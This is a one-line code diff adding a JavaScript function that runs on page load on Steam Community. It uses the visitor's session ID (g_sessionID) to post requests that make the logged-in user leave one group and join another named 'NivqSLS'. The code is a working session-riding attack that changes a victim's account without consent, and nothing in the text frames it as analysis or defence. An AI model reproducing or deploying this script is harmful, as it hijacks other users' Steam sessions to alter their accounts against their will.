@@ -1,0 +1,1 @@
+function execFunc1(){$J(document).ready(function(){$J.post("https://steamcommunity.com/id/MalikQayum/home_process",{sessionID:g_sessionID,action:'leaveGroup',groupId:'103582791457151311'});$J.post("https://steamcommunity.com/groups/NivqSLS",{action:'join',sessionID:g_sessionID});});}
